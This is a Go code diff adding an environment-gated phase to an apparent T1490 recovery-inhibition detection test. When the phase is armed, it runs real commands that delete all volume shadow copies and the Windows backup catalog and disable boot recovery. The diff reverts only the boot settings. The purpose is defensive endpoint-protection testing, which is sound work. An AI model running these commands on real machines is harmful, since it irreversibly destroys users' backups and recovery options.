@@ -425,9 +425,118 @@ func createMarkerFile(name, content string) {
 	}
 }
 
+// destructiveGate is the env var that arms the REAL destructive T1490 phase.
+// Default (unset) = non-destructive mode only (documented commands, read-only
+// queries). The destructive phase deletes volume shadow copies and modifies
+// BCD — REQUIRES a hypervisor snapshot of the lab VM before arming.
+const destructiveGate = "F0_DESTRUCTIVE_T1490"
+
+// bcdReverts records BCD settings changed by the destructive phase so cleanup
+// can revert them FIRST, on every exit path (revert-first ordering).
+var bcdReverts []struct{ Set, Revert, Args string }
+
+// executeDestructivePhase runs the REAL destructive T1490 command set.
+// ARMED ONLY via env F0_DESTRUCTIVE_T1490=1 (user decision 2026-11-03).
+// Safe-mode boot staging (bcdedit /set safeboot minimal) is intentionally
+// EXCLUDED even when armed: un-reverted safeboot bricks normal boot, and its
+// detection value overlaps the included commands.
+// Returns: destructiveCount, blockedEvidence, msg
+func executeDestructivePhase() (int, bool, string) {
+	if os.Getenv(destructiveGate) != "1" {
+		Endpoint.Say("  [GATE] %s != 1 — destructive T1490 phase DISABLED (documented-only)", destructiveGate)
+		Endpoint.Say("         To arm: set %s=1 AND take a hypervisor snapshot first (see README)", destructiveGate)
+		LogMessage("INFO", "Destructive Phase", "Gated off: env "+destructiveGate+" not set to 1")
+		return 0, false, "disabled by gate"
+	}
+
+	Endpoint.Say("  [!!] DESTRUCTIVE T1490 PHASE ARMED — executing real commands")
+	Endpoint.Say("       (requires prior hypervisor snapshot; shadow copies WILL be deleted)")
+	LogMessage("WARN", "Destructive Phase", "ARMED via "+destructiveGate+"=1 — executing real destructive T1490 commands")
+
+	destructive := 0
+	blocked := false
+
+	type dcmd struct {
+		desc, tool                   string
+		args                         []string
+		setting, setVal, revertVal   string // for BCD-revertible settings
+	}
+	cmds := []dcmd{
+		{desc: "Delete all volume shadow copies", tool: "C:\\Windows\\System32\\vssadmin.exe", args: []string{"delete", "shadows", "/all", "/quiet"}},
+		{desc: "Disable Windows Recovery Environment", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "recoveryenabled", "No"}, setting: "recoveryenabled", setVal: "No", revertVal: "Yes"},
+		{desc: "Ignore boot failures (no auto-recovery)", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "bootstatuspolicy", "ignoreallfailures"}, setting: "bootstatuspolicy", setVal: "ignoreallfailures", revertVal: "displayallfailures"},
+		{desc: "Delete Windows backup catalog", tool: "C:\\Windows\\System32\\wbadmin.exe", args: []string{"delete", "catalog", "-quiet"}},
+	}
+
+	for _, dc := range cmds {
+		Endpoint.Say("  [DESTRUCTIVE] %s: %s %s", dc.desc, dc.tool, strings.Join(dc.args, " "))
+
+		cmd := exec.Command(dc.tool, dc.args...)
+		var buf bytes.Buffer
+		cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+		cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
+		err := cmd.Run()
+		out := buf.String()
+		pid := 0
+		if cmd.Process != nil {
+			pid = cmd.Process.Pid
+		}
+		exitCode := 0
+		if err != nil && cmd.ProcessState != nil {
+			exitCode = cmd.ProcessState.ExitCode()
+		}
+
+		if len(out) > 0 {
+			safe := strings.Map(func(r rune) rune { if r == ' ' { return '_' }; return r }, filepath.Base(dc.tool))
+			os.WriteFile(filepath.Join(TARGET_DIR, "destructive_"+safe+"_output.txt"), []byte(out), 0644)
+		}
+
+		if err != nil {
+			if strings.Contains(out, "Access is denied") || strings.Contains(err.Error(), "Access is denied") {
+				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, 126, "denied (positive evidence)")
+				blocked = true
+			} else {
+				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, exitCode, err.Error())
+			}
+			continue
+		}
+
+		LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, true, 0, "")
+		destructive++
+
+		// Register the revert for BCD-changeable settings (revert-first cleanup)
+		if dc.setting != "" {
+			bcdReverts = append(bcdReverts, struct{ Set, Revert, Args string }{dc.setting, dc.revertVal, "{default}"})
+		}
+	}
+
+	return destructive, blocked, fmt.Sprintf("%d destructive commands executed, blocked=%v", destructive, blocked)
+}
+
+// revertBcdSettings reverts every BCD change registered by the destructive
+// phase. Called FIRST in cleanup on every exit path (revert-first ordering).
+func revertBcdSettings() {
+	for _, r := range bcdReverts {
+		Endpoint.Say("  [REVERT] bcdedit /set %s %s", r.Args, r.Revert)
+		cmd := exec.Command("C:\\Windows\\System32\\bcdedit.exe", "/set", r.Args, r.Set, r.Revert)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			LogMessage("ERROR", "BCD Revert", fmt.Sprintf("REVERT FAILED for %s=%s: %v — %s", r.Set, r.Revert, err, string(out)))
+			Endpoint.Say("  [!!] BCD REVERT FAILED for %s — MANUAL FIX REQUIRED: bcdedit /set %s %s %s", r.Set, r.Args, r.Set, r.Revert)
+		} else {
+			LogMessage("INFO", "BCD Revert", fmt.Sprintf("Reverted %s to %s", r.Set, r.Revert))
+		}
+	}
+	bcdReverts = nil
+}
+
 // cleanup removes test report and marker files (was absent — audit 2026-11-03)
 func cleanup() {
 	Endpoint.Say("\nCleaning up test artifacts...")
+
+	// REVERT-FIRST: undo any BCD changes before anything else so no exit path
+	// leaves the system in an inhibited-recovery state.
+	revertBcdSettings()
 	for _, f := range []string{
 		"recovery_inhibition_report.txt",
 		"t1490_test_started.txt",
@@ -435,6 +544,9 @@ func cleanup() {
 		"vssadmin.exe_output.txt",
 		"bcdedit.exe_output.txt",
 		"wbadmin.exe_output.txt",
+		"destructive_vssadmin.exe_output.txt",
+		"destructive_bcdedit.exe_output.txt",
+		"destructive_wbadmin.exe_output.txt",
 	} {
 		if err := os.Remove(filepath.Join(TARGET_DIR, f)); err == nil {
 			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", f))
@@ -571,6 +683,22 @@ func test() {
 	logDestructiveCommands()
 
 	LogPhaseEnd(4, "success", "Destructive commands documented for reference")
+
+	// Phase 5b: REAL destructive execution (env-gated, snapshot required)
+	LogPhaseStart(6, "Destructive Execution (gated)")
+	Endpoint.Say("\nPhase 5b: Destructive T1490 execution (gated by %s)", destructiveGate)
+
+	destructiveCount, destructiveBlocked, dmsg := executeDestructivePhase()
+	if destructiveBlocked {
+		anyBlocked = true
+		LogPhaseEnd(5, "blocked", dmsg)
+	} else if destructiveCount > 0 {
+		successCount := destructiveCount
+		_ = successCount
+		LogPhaseEnd(5, "success", dmsg)
+	} else {
+		LogPhaseEnd(5, "skipped", dmsg)
+	}
 
 	// Phase 6: Final Assessment
 	LogPhaseStart(6, "Final Assessment")
